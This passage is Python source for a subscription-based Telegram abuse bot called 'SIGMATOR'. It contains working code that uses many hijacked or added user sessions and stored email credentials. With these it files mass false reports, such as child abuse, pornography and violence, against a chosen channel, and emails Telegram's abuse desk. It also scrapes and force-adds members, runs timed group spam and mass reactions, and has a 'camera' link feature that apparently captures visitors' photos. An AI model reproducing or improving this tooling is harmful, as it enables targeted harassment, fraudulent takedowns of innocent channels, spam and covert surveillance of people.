        'child':('URGENT: Child Abuse Content on Telegram',
                 f"""Dear Telegram Trust and Safety Team,

I am reporting child abuse content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate immediately.

Sincerely,
A Concerned User"""),
        'porn':('Report: Unauthorized Pornographic Content',
                f"""Dear Telegram Trust and Safety Team,

I am reporting unauthorized pornographic content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Telegram User"""),
        'violence':('URGENT: Violent Content on Telegram',
                    f"""Dear Telegram Safety Team,

I am reporting violent content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Concerned User"""),
        'copyright':('Copyright Infringement Report',
                     f"""Dear Telegram Trust and Safety Team,

I am reporting copyright infringement.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Rights Holder"""),
    }
    t = T.get(mode,T['scam']); return t[0],t[1]

# ==================== SMART ATTACK ====================
async def smart_attack(bot,cid,mid,mode):
    global TARGET,TARGET_ACCOUNT,is_attacking,selected_report_count,use_selected_sessions,selected_sessions_list
    cr,ce,rr,re = check_daily_limit()
    if not cr and not ce: await bot.edit_message(cid,mid,f"DAILY LIMIT REACHED!\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}"); return
    if TARGET=='target': await bot.edit_message(cid,mid,"Set target first!"); return
    is_attacking = True; rs,es = 0,0
    
    await bot.edit_message(cid,mid,"AI analyzing channel...")
    imp = ai_channel(TARGET)
    await bot.edit_message(cid,mid,f"AI: {imp}\n\nScanning posts...")
    scan = await scan_channel(TARGET)
    ac = scan.get('accounts',[]); lk = scan.get('links',[])
    
    sessions = get_sessions()
    if use_selected_sessions and selected_sessions_list:
        sessions = [s for s in sessions if os.path.basename(s) in selected_sessions_list]
    if selected_report_count > 0:
        sessions = sessions[:selected_report_count]
    
    await bot.edit_message(cid,mid,f"TARGET: {TARGET}\nIMPERSONATING: {imp}\nAccounts: {len(ac)}\nSessions: {len(sessions)}\n\nStarting reports & emails...")
    
    if cr:
        reasons = {"scam":types.InputReportReasonSpam(),"porn":types.InputReportReasonPornography(),"violence":types.InputReportReasonViolence(),"child":types.InputReportReasonChildAbuse(),"copyright":types.InputReportReasonCopyright(),"fake":types.InputReportReasonFake()}
        reason = reasons.get(mode,types.InputReportReasonSpam())
        use = sessions[:rr] if len(sessions)>rr else sessions
        for idx,s in enumerate(use,1):
            if not is_attacking: break
            res = await report_worker(s,TARGET.replace('@','').strip(),reason,f"{mode}")
            if res==1: rs+=1
            if idx%5==0:
                try: await bot.edit_message(cid,mid,f"Reports: {rs}/{len(use)}\nEmails: {es}")
                except: pass
            await asyncio.sleep(random.uniform(0.5,1.5))
    
    if ce:
        subj,body = gen_email(mode,TARGET,TARGET_ACCOUNT,scan,imp)
        emails = load_emails()
        use = emails[:re] if len(emails)>re else emails
        for idx,em in enumerate(use,1):
            if not is_attacking: break
            msg = MIMEMultipart(); msg['From']=em['email']; msg['To']="abuse@telegram.org"
            msg['Subject']=subj; msg.attach(MIMEText(body,'plain','utf-8'))
            result = await asyncio.get_event_loop().run_in_executor(None,lambda:send_smtp(em['email'],em['password'],msg))
            if result: es+=1
            if idx%2==0:
                try: await bot.edit_message(cid,mid,f"Reports: {rs}\nEmails: {es}/{len(use)}")
                except: pass
            await asyncio.sleep(random.uniform(2.0,4.0))
    
    increment_daily_counter(rs,es); is_attacking = False
    total_ac = len(sessions); success_rate = (rs/total_ac*100) if total_ac>0 else 0
    
    final = f"ATTACK COMPLETE\n\nMode: {mode.upper()}\nTarget: {TARGET}\nImpersonating: {imp}\n\nAccounts: {rs}/{total_ac}\nSuccess: {success_rate:.1f}%\nReports: {rs}\nEmails: {es}\n\nDaily left: {rr-rs}"
    if ac: final += "\n\nDetected:\n"+'\n'.join([f'  - @{a}' for a in ac[:5]])
    await bot.edit_message(cid,mid,final)

# ==================== PANEL ====================
async def show_panel(e):
    cid = e.chat_id; mid = e.message_id; uid = e.sender_id
    sessions = get_sessions()
    emails = load_emails()
    members = load_members()
    uptime = datetime.now() - bot_start_time
    days = uptime.days; hours = uptime.seconds//3600; minutes = (uptime.seconds%3600)//60
    cr,ce,rr,re = check_daily_limit()
    
    text = f"""SIGMATOR CONTROL PANEL
========================
Uptime: {days}d {hours}h {minutes}m
Sessions: {len(sessions)}
Emails: {len(emails)}
Scraped Members: {len(members)}
Daily: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}
Target: {TARGET}
Status: {'RUNNING' if is_attacking else 'IDLE'}
========================

SELECT SESSIONS:
Total: {len(sessions)} | Selected: {selected_report_count if selected_report_count>0 else 'ALL'}"""
    
    btns = [
        [Button.inline("Select 5 sessions",b"sel_5"), Button.inline("Select 10",b"sel_10")],
        [Button.inline("Select 20 sessions",b"sel_20"), Button.inline("Select ALL",b"sel_all")],
        [Button.inline("SCRAPE MEMBERS",b"scrape_members")],
        [Button.inline("ADD MEMBERS",b"add_members_menu")],
        [Button.inline("FIRST MSG FINDER",b"first_msg")],
        [Button.inline("CHECK ONLINE",b"check_online")],
        [Button.inline("Back to Menu",b"back")],
    ]
    
    await e.client.edit_message(cid,mid,text,buttons=btns)

# ==================== MENU ====================
async def get_menu(uid=None):
    global is_clock_active,is_auto_spam_active,selected_report_count
    is_admin = uid in ADMINS if uid else False
    sub = get_user_sub(uid) if uid and not is_admin else None
    has_sub = sub is not None and not sub.get('pending',False)
    cr,ce,rr,_ = check_daily_limit()
    
    if uid and not is_admin and not has_sub:
        txt = f"SIGMATOR BOT\n\nACCESS DENIED\n\nContact: {ADMIN_CONTACT}"
        btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")]]
        return txt,btns
    
    txt = f"""SIGMATOR BOT
================
Target: {TARGET}
Sessions: {len(get_sessions())} | Selected: {selected_report_count if selected_report_count>0 else 'ALL'}
Emails: {len(load_emails())} | Members: {len(load_members())}
Daily: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}
Clock: {'ON' if is_clock_active else 'OFF'}
Status: {'RUNNING' if is_attacking else 'IDLE'}
================"""
    
    if not cr and not ce:
        btns = [
            [Button.inline("DAILY LIMIT REACHED",b"limit_info")],
            [Button.inline("SET TARGET",b"set"),Button.inline("PANEL",b"panel")],
            [Button.inline("STOP",b"stop")],
        ]
    else:
        btns = [
            [Button.inline("SCAM + REPORT + EMAIL",b"a_scam")],
            [Button.inline("FAKE + REPORT + EMAIL",b"a_fake")],
            [Button.inline("CHILD + REPORT + EMAIL",b"a_child")],
            [Button.inline("PORN + REPORT + EMAIL",b"a_porn")],
            [Button.inline("VIOLENCE + REPORT + EMAIL",b"a_violence")],
            [Button.inline("COPYRIGHT + REPORT + EMAIL",b"a_copyright")],
            [Button.inline("FAST PYROGRAM",b"fast_pyrogram")],
            [Button.inline("ch/gp join",b"join_group"),Button.inline("GROUP REPORT",b"group_report_menu")],
            [Button.inline("REPORT PROFILE",b"report_profile")],
            [Button.inline("SET TARGET",b"set"),Button.inline("PANEL",b"panel")],
            [Button.inline("CLOCK",b"clock_menu"),Button.inline("SEND MSG",b"msg_menu")],
            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT",b"react_pos")],
            [Button.inline("PROXY",b"proxy_main"),Button.inline("EMAIL",b"email_menu")],
            [Button.inline("SPAM",b"auto_spam_menu"),Button.inline("CAMERA",b"camera_menu")],
            [Button.inline("PING",b"ping"),Button.inline("STOP",b"stop")],
        ]
    if is_admin: btns.append([Button.inline("ADMINS",b"admin_menu")])
    return txt,btns

# ==================== MAIN BOT ====================
async def main():
    global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
    global is_auto_spam_active,auto_spam_task,camera_link,selected_report_count,use_selected_sessions,selected_sessions_list,scraped_members

    unlock_all()
    scraped_members = load_members()
    bot = TelegramClient('bot_main',API_ID,API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    print(f"[+] SIGMATOR STARTED")
    print(f"[+] Sessions: {len(get_sessions())} | Emails: {len(load_emails())} | Members: {len(scraped_members)}")

    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(e):
        txt,btns = await get_menu(e.sender_id)
        await e.respond(txt,buttons=btns)

    @bot.on(events.NewMessage(pattern='/lock'))
    async def lock_cmd(e):
        if e.sender_id!=MASTER_ID: return
        await e.respond("Locking..."); lock_all(); await e.respond("Locked!")

    @bot.on(events.NewMessage(pattern='/add'))
    async def add_cmd(e):
        sub = get_user_sub(e.sender_id)
        if not sub: await e.respond("No subscription!"); return
        async with bot.conversation(e.chat_id,timeout=300) as conv:
            await conv.send_message("Phone: +989123456789")
            phone = (await conv.get_response()).text.strip()
            if not phone.startswith('+'): phone = '+'+phone
            sp = f"{SESSION_DIR}/{phone.replace('+','')}"
            client = TelegramClient(sp,API_ID,API_HASH)
            await client.connect(); await client.send_code_request(phone)
            await conv.send_message("Code:")
            code = (await conv.get_response()).text.strip()
            try: await client.sign_in(phone,code)
            except:
                await conv.send_message("2FA:")
                await client.sign_in(password=(await conv.get_response()).text.strip())
            me = await client.get_me(); await client.disconnect()
            await conv.send_message(f"Added: {me.first_name}")

    @bot.on(events.CallbackQuery)
    async def callback(e):
        global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
        global is_auto_spam_active,auto_spam_task,camera_link,selected_report_count,use_selected_sessions,selected_sessions_list,scraped_members

        is_admin = e.sender_id in ADMINS
        sub = get_user_sub(e.sender_id) if not is_admin else None
        has_sub = sub is not None and not sub.get('pending',False)
        
        if not is_admin and not has_sub:
            if e.data.decode() not in ["sub_free","sub_buy","sub_status"]:
                await e.answer("Subscribe to access!",alert=True); return
        
        allowed, warning = check_spam(e.sender_id)
        if not allowed:
            await e.answer(warning,alert=True); return
        if warning:
            await e.answer(warning,alert=True)
        
        await e.answer()
        data = e.data.decode()

        if data.startswith("a_"):
            if TARGET=='target': await e.respond("Set target!"); return
            cr,ce,_,_ = check_daily_limit()
            if not cr and not ce: await e.respond("DAILY LIMIT!"); return
            mode = data.split('_')[1]
            msg = await e.respond(f"Starting {mode.upper()}...")
            is_attacking = True
            asyncio.create_task(smart_attack(bot,e.chat_id,msg.id,mode))

        elif data == "panel":
            await show_panel(e)

        elif data.startswith("sel_"):
            count = data.split('_')[1]
            if count == "all":
                selected_report_count = 0
                use_selected_sessions = False
                selected_sessions_list = []
                await e.respond("Selected: ALL sessions")
            else:
                selected_report_count = int(count)
                use_selected_sessions = True
                await e.respond(f"Selected: {count} sessions")

        elif data == "scrape_members":
            if TARGET=='target': await e.respond("Set target group first!"); return
            msg = await e.respond("Starting member scrape...")
            asyncio.create_task(run_scrape_members(bot,e.chat_id,msg.id))

        elif data == "add_members_menu":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message(f"Send target group to add members to:\n(Current scraped: {len(scraped_members)} members)")
                target_grp = (await conv.get_response()).text.strip()
                await conv.send_message("How many members to add?")
                count = int((await conv.get_response()).text.strip())
                msg = await conv.send_message("Adding members...")
                asyncio.create_task(run_add_members(bot,e.chat_id,msg.id,target_grp,count))

        elif data == "first_msg":
            if TARGET=='target': await e.respond("Set target!"); return
            await e.respond("Searching...")
            result = await find_first_message(TARGET)
            await e.respond(result)

        elif data == "check_online":
            async with bot.conversation(e.chat_id,timeout=30) as conv:
                await conv.send_message("Username (without @):")
                username = (await conv.get_response()).text.strip()
                await conv.send_message("Checking...")
                result = await check_user_online(username)
                await conv.send_message(result)

        elif data == "fast_pyrogram":
            if TARGET=='target': await e.respond("Set target!"); return
            msg = await e.respond("Starting..."); asyncio.create_task(run_fast_pyrogram(bot,e.chat_id,msg.id))

        elif data == "join_group":
            if TARGET=='target': await e.respond("Set target!"); return
            msg = await e.respond("Joining..."); asyncio.create_task(run_join_group(bot,e.chat_id,msg.id))

        elif data == "group_report_menu":
            if TARGET=='target': await e.respond("Set target!"); return
            btns = []
            for i,(reason,msg) in enumerate(ALL_REPORT_REASONS): btns.append([Button.inline(msg[:40],f"select_reason_{i}")])
            btns.append([Button.inline("ALL REASONS",b"select_all_reasons")]); btns.append([Button.inline("Back",b"back")])
            await e.edit("SELECT:",buttons=btns)

        elif data.startswith("select_reason_"):
            idx = int(data.split("_")[2])
            reason,msg = ALL_REPORT_REASONS[idx]
            msg = await e.respond(f"Reporting..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,[(reason,msg)]))

        elif data == "select_all_reasons":
            msg = await e.respond("Reporting ALL..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,ALL_REPORT_REASONS))

        elif data == "report_profile":
            if TARGET=='target': await e.respond("Set target!"); return
            msg = await e.respond("Reporting profile..."); sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await report_worker(s,TARGET.replace('@','').strip(),types.InputReportReasonSpam(),"Fake account")
                if res==1: ok+=1
                else: fail+=1
            await msg.edit(f"Profile Report Done!\nSuccess: {ok}\nFailed: {fail}")

        elif data == "set":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("Channel/Username:"); TARGET = (await conv.get_response()).text.strip()
                await conv.send_message("Account (or skip):"); acc = (await conv.get_response()).text.strip()
                TARGET_ACCOUNT = None if acc.lower()=='skip' else acc
                ai_r = ai_channel(TARGET)
                await conv.send_message(f"Set!\nChannel: {TARGET}\nAccount: {TARGET_ACCOUNT or 'N/A'}\nAI: {ai_r}")

        elif data == "stop":
            is_attacking = False; is_auto_spam_active = False; scraping_active = False
            if auto_spam_task: auto_spam_task.cancel()
            if clock_task: clock_task.cancel()
            txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)

        elif data == "back":
            txt,btns = await get_menu(e.sender_id)
            try: await e.edit(txt,buttons=btns)
            except: pass

        elif data == "ping":
            t = time.time(); await bot.get_me()
            await e.edit(f"Ping: {int((time.time()-t)*1000)}ms")

        elif data == "leave_ch":
            if TARGET=='target': await e.respond("Set target!"); return
            sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await leave_worker(s,TARGET)
                if res=="left": ok+=1
                else: fail+=1
            await e.respond(f"Left: {ok} | Failed: {fail}")

        elif data in ("react_pos","react_neg"):
            if TARGET=='target': await e.respond("Set target!"); return
            emojies = ["like","fire","heart"] if data=="react_pos" else ["dislike","poop","clown"]
            sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await reaction_worker(s,TARGET,emojies)
                if res=="success": ok+=1
                else: fail+=1
            await e.respond(f"Reactions: {ok} | Failed: {fail}")

        elif data == "clock_menu":
            if is_clock_active:
                is_clock_active = False
                if clock_task: clock_task.cancel()
                txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)
            else:
                sessions = get_sessions()
                if not sessions: await e.respond("No sessions!"); return
                btns = []
                for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"clk_{i}")])
                btns.append([Button.inline("Back",b"back")]); await e.edit("Select:",buttons=btns)

        elif data.startswith("clk_"):
            idx = int(data.split('_')[1]); sessions = get_sessions()
            if idx>=len(sessions): return
            if is_clock_active: is_clock_active = False
            if clock_task: clock_task.cancel()
            sp = sessions[idx]; client = create_stable_client(sp); await client.connect()
            if await client.is_user_authorized():
                is_clock_active = True; clock_task = asyncio.create_task(clock_task_func(client))
                await e.respond(f"Clock ON: {os.path.basename(sp)}")
            else: await e.respond("Not authorized!")

        elif data == "msg_menu":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("Recipient:"); tu = (await conv.get_response()).text.strip()
                await conv.send_message("Text:"); mt = (await conv.get_response()).text.strip()
                sessions = get_sessions(); ok,fail = 0,0
                for s in sessions:
                    res = await send_msg_worker(s,tu,mt)
                    if res=="success": ok+=1
                    else: fail+=1
                await conv.send_message(f"Sent: {ok} | Failed: {fail}")

        elif data == "proxy_main":
            btns = [[Button.inline("View Proxies",b"view_proxies")],[Button.inline("Set Proxy",b"set_proxy")],[Button.inline("Back",b"back")]]
            await e.edit("PROXY",buttons=btns)

        elif data == "view_proxies":
            px = load_proxies()
            if not px: await e.edit("No proxies!"); return
            txt = "PROXY LIST\n\n"
            for s,p in list(px.items())[:15]: txt += f"- {s}: {p[:40]}\n"
            await e.edit(txt,buttons=[[Button.inline("Back",b"proxy_main")]])

        elif data == "set_proxy":
            sessions = get_sessions()
            if not sessions: await e.respond("No sessions!"); return
            btns = []
            for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"setproxy_{i}")])
            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select:",buttons=btns)

        elif data.startswith("setproxy_"):
            idx = int(data.split('_')[1]); sn = os.path.basename(get_sessions()[idx])
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message(f"Session: {sn}\n\nProxy:"); pi = (await conv.get_response()).text.strip()
                px = load_proxies()
                if pi.lower()=='none': px.pop(sn,None)
                else: px[sn]=pi
                save_proxies(px); await conv.send_message("Saved!")

        elif data == "email_menu":
            em = load_emails()
            btns = [[Button.inline(f"View Emails ({len(em)})",b"view_emails")],[Button.inline("Add Email",b"add_email")],[Button.inline("Back",b"back")]]
            await e.edit("EMAIL",buttons=btns)

        elif data == "view_emails":
            em = load_emails()
            if not em: await e.edit("No emails!"); return
            txt = f"EMAILS ({len(em)}):\n\n"
            for i,e in enumerate(em,1): txt += f"{i}. {e['email']}\n"
            await e.edit(txt,buttons=[[Button.inline("Back",b"email_menu")]])

        elif data == "add_email":
            async with bot.conversation(e.chat_id,timeout=120) as conv:
                await conv.send_message("Email:"); ea = (await conv.get_response()).text.strip()
                await conv.send_message("Password:"); pw = (await conv.get_response()).text.strip()
                em = load_emails(); em.append({"email":ea,"password":pw})
                save_emails(em); await conv.send_message(f"Saved! Total: {len(em)}")

        elif data == "auto_spam_menu":
            if is_auto_spam_active:
                await e.edit("SPAM RUNNING",buttons=[[Button.inline("STOP",b"stop_auto_spam")],[Button.inline("Back",b"back")]])
            else:
                sessions = get_sessions()
                if not sessions: await e.respond("No sessions!"); return
                btns = []
                for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"as_{i}")])
                btns.append([Button.inline("Back",b"back")]); await e.edit("Select:",buttons=btns)

        elif data.startswith("as_"):
            idx = int(data.split('_')[1]); sp = get_sessions()[idx]
            async with bot.conversation(e.chat_id,timeout=120) as conv:
                await conv.send_message("Group:"); grp = (await conv.get_response()).text.strip()
                await conv.send_message("Message:"); msg = (await conv.get_response()).text.strip()
                await conv.send_message("Interval (s):")
                try: interval = int((await conv.get_response()).text.strip())
                except: interval = 60
                patch_session_db(sp); client = create_stable_client(sp); await client.connect()
                if await client.is_user_authorized():
                    is_auto_spam_active = True
                    auto_spam_task = asyncio.create_task(auto_spam_worker(client,grp,msg,interval))
                    await conv.send_message(f"Started! Interval: {interval}s")
                else: await conv.send_message("Not authorized!")

        elif data == "stop_auto_spam":
            is_auto_spam_active = False
            if auto_spam_task: auto_spam_task.cancel()
            await e.respond("Stopped!")

        elif data == "camera_menu":
            if camera_link:
                btns = [[Button.inline("Get Link",b"cam_get_link")],[Button.inline("Check Photo",b"cam_check_photo")],[Button.inline("Back",b"back")]]
                await e.edit("CAMERA",buttons=btns)
            else:
                btns = [[Button.inline("Start Camera",b"cam_start")],[Button.inline("Back",b"back")]]
                await e.edit("CAMERA",buttons=btns)

        elif data == "cam_start":
            await e.respond("Starting...")
            link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
            if link: await e.respond(f"Ready!\n{link}")
            else: await e.respond("Failed!")

        elif data == "cam_get_link":
            await e.respond(f"Link:\n{camera_link}" if camera_link else "No link!")

        elif data == "cam_check_photo":
            photos = glob.glob('./camera_*.jpg')
            if photos:
                latest = max(photos,key=os.path.getctime)
                await bot.send_file(e.chat_id,latest,caption="Latest")
            else: await e.respond("No photo!")

        elif data == "sub_free":
            uid = str(e.sender_id)
            subscribers[uid] = {'plan':'free','sessions':5,'expiry':'pending','added':datetime.now().isoformat(),'pending':True}
            save_subscribers(subscribers)
            await e.respond("Free plan! Add 5 accounts with /add")

        elif data == "sub_buy":
            await e.respond(f"Premium Plans\n\n7D-50k\n1M-100k\n3M-200k\n1Y-500k\nContact: {ADMIN_CONTACT}")

        elif data == "sub_status":
            sub = get_user_sub(e.sender_id)
            if sub:
                if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']}")
                else:
                    expiry = datetime.fromisoformat(sub['expiry'])
                    await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{(expiry-datetime.now()).days} days left")
            else: await e.respond("No subscription!")

        elif data == "admin_menu":
            admins = load_admins(); txt = f"ADMINS ({len(admins)}/{MAX_ADMINS})\n\n"
            for i,a in enumerate(admins,1): txt += f"{i}. {a}\n"
            btns = [[Button.inline("Add Admin",b"admin_add")],[Button.inline("Remove Admin",b"admin_remove")],[Button.inline("Back",b"back")]]
            await e.edit(txt,buttons=btns)

        elif data == "admin_add":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message(f"User ID ({len(load_admins())}/{MAX_ADMINS}):")
                try:
                    new_id = int((await conv.get_response()).text.strip())
                    success,msg = add_admin(new_id)
                    if success: ADMINS.clear(); ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except: await conv.send_message("Invalid!")

        elif data == "admin_remove":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("User ID:")
                try:
                    del_id = int((await conv.get_response()).text.strip())
                    success,msg = remove_admin(del_id)
                    if success: ADMINS.clear(); ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except: await conv.send_message("Invalid!")

        elif data == "limit_info":
            cr,ce,rr,re = check_daily_limit()
            await e.respond(f"DAILY LIMITS\nReports: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}\nEmails: {DAILY_REPORT_LIMIT-re}/{DAILY_REPORT_LIMIT}\n\nResets midnight.")

    import atexit; atexit.register(lock_all)
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: lock_all(); print("\n[!] Locked & Stopped"); sys.exit(0)